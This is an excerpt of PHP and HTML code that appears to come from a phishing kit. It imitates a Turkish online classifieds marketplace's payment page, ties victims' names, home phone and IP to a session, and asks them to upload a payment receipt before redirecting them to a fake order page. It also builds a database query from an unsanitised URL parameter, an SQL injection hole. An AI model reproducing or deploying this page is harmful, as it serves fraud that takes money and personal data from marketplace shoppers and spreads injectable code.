...
$id = $_GET["id"];
$ip = $_SESSION["tum"]["ip"];
$firstName = $_SESSION["tum"]["firstName"];
$lastName = $_SESSION["tum"]["lastName"];
$homePhone = $_SESSION["tum"]["homePhone"];
...
$get = $dbh->prepare("SELECT * FROM info WHERE id=:id AND ip=:ip AND firstName=:firstName AND lastName=:lastName AND homePhone=:homePhone");
$get->execute(["id" => $id, "firstName" => $firstName, "lastName" => $lastName, "homePhone" => $homePhone, "ip" => $ip]);
$rowC = $get->rowCount();

if(($ip !== $_SERVER['REMOTE_ADDR']) || !($rowC) || empty($id) || !($_SESSION['tum']) || !($id === $_SESSION['tum']['id'])){
...
$q = $_GET['q'];
$query = $dbh->query("SELECT * FROM ilan_telefon WHERE ilanurl = '{$q}'")->fetch(PDO::FETCH_ASSOC);
if ($query){
?>
<!DOCTYPE html>
<html class="" lang="tr">
  ...
  <body class="type-individual ios">
    ...
    <div id="container">
      ...
      <div class="set-payment-container set-payment-active-step-1">
        ...
        <span id="classified-id">930925320</span>
        <form action="#" method="POST" autocomplete="off">
            <div class="set-payment-step-3-detail" style="display: block">
              <div class="left-box">
                  ...
                  <div id="creditCardPayment" class="paymentTypes">
                      <div class="credit-card-form">
                          ...
                          <h2>Lütfen ödeme yaptığınıza dair makbuz yükleyin.</h2>
                          ...
                          <input id="file-upload" type="file" name="fileUpload" accept="image/*" />
                              ...
                              <div id="start">
                                  ...
                                  <div>Makbuz resmini yükleyiniz.</div>
                                  <div id="notimage" class="hidden">Please select an image</div>
                                  <span id="file-upload-btn" class="btn btn-primary">Resim seç</span>
                                  <span class="filename" style="display: block;"></span>
                              </div>
                              </label>
                          </div>
                          </div>
              ...
              <div class="make-payment-btn-wrapper">
                  ...
                  <button type="submit" class="btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 responsiveComplete">
                    <span>Ödemeyi Tamamla</span>
                  </button>
                </div>
              </div>
    ...
    <script>
      document.addEventListener('DOMContentLoaded', () => {
          if (window.matchMedia('screen and (max-width: 768px)').matches) {
              ...
              const form = document.querySelector("#container > div.set-payment-container.set-payment-active-step-1 > form");              
              form.addEventListener('submit', (e) => {
                  e.preventDefault();
                  let rExp = (value) => (/\.(|jpe?g|png|jfif)$/i).test(value);
                  let fileName = document.querySelector('.filename').textContent;

                  async function uploadFile() {
                      let myForm = e.target;
                      let formData = new FormData(myForm);
                      const response = await fetch('settings/img.php?id=<?=$id?>', {
                          method: "POST",
                          body: formData
                      });
                      const data = await response.json();
                      if (data['status'] == "done") {
                          window.location.href = "final.php?siparis=<?=rand(100000,9999999)?>";
                      }
                  }
                  ...
                  if (rExp(fileName)) {
                    ...
                    document.querySelector("#start > div:nth-child(2)").textContent = "Lütfen geçerli bir dosya yükleyiniz";
                    document.querySelector('#file-drag').style.border = '2px solid red';
                    document.querySelector("#start > div:nth-child(2)").style.color = 'red'
                  }
              })

              fileInput.addEventListener('change', (e) => {
                  const filenames = document.querySelector('.filename');
                  filenames.textContent = e.target.files[0].name;

                  if (filenames.textContent.length > 0) {
                      fileInput.nextElementSibling.style.border = "3px solid #00a698";
                      document.querySelector("#start > div:nth-child(2)").textContent = "Ödemenizi tamamlayınız";
                  } else {
                      fileInput.nextElementSibling.style.border = "3px solid #eee";
                      document.querySelector("#start > div:nth-child(2)").textContent = "Makbuz resmini yükleyiniz.";
                  }
              })
          } else {
              const fileInput = document.getElementById('file-upload');
